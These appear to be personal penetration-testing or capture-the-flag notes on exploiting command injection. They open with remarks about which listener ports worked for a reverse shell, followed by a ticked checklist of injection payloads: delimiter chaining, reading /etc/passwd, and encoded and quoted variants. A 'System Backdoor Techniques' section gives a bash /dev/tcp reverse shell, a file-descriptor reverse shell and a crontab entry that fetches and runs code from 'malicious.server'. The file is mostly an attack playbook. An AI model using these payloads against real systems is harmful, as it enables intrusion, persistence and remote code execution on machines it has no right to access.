### 1.`RHP` for the command injections such as `9000` did not work, only lower common ports worked such as `80`
`9000` continuously loading and crashing

`80` loading for a while then crashing

but popped a reverse shell

### 2. Create an initial list of stuff to try
#### Initial things to try
If `user input` is incorporated into system commands without proper sanitization, test if you can execute arbitrary commands on the server.
Example: Inject payloads into input fields or parameters to execute system commands, such as:
`; ls` or `&& ls` to list files in the current directory.  [ ]
`; cat /etc/passwd` to read sensitive files.
`| whoami` to determine the user context of the application.
Using payloads like `$(id)` or `` `id` `` to execute commands in subshells.
Test using variations of common delimiters (`;`, `&&`, `||`, `|`, `$( )`, `` ` ` ``) depending on the command execution context.

##### Basic Command Injection Payloads
- [ ] 
- [x] `; ls` 
- [x]  `&& ls` 
- [x] `| whoami`
- [x] `; cat /etc/passwd`
- [x] `&& id`
- [x] `$(id)`
- [x] `` `id` ``
- [x] `; echo Hello`
- [x] `;which nc`

##### Encoded and Obfuscated Variants

1. URL encoding: `%3Bls` (`;ls`)
2. Base64 encoding: `$(echo aWQ= | base64 -d | sh)` (`id`)
3. Hex encoding: `$'\x69\x64'` (`id`)

---

##### Special Characters and Escaping

1. `\` Injection: `\` followed by the command
2. Single-quote bypass: `'; ls #`
3. Double-quote bypass: `"; ls #`
4. Multi-command chaining: `ls; cat /etc/passwd`

---

##### Environmental Variable and File Descriptors

1. `$(cat /etc/passwd)`
2. `${IFS}ls` (using the IFS variable)
3. `/bin/sh -c ls`
4. `0<&196;exec 196<>/dev/tcp/<IP>/<PORT>;sh <&196 >&196 2>&196`

---

##### Advanced Injection Techniques

1. `;$(id)`
2. `;perl -e 'print "Hacked"'`
3. `&$(python3 -c 'print("Hacked")')`
4. `| awk 'BEGIN {system("ls")}'`
5. `| bash -c 'echo Exploited'`

---

##### System Backdoor Techniques

1. Reverse shell payload: `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
2. Write to crontab: `; echo '* * * * * /bin/bash -c "curl http://malicious.server | sh"' | crontab -`

### 3. Not all directories are writeable, I had to write to `/tmp` - this still didnt work

### 4. Identify all scripts languages on the machine to generate reverse shells, and use them all if none are working
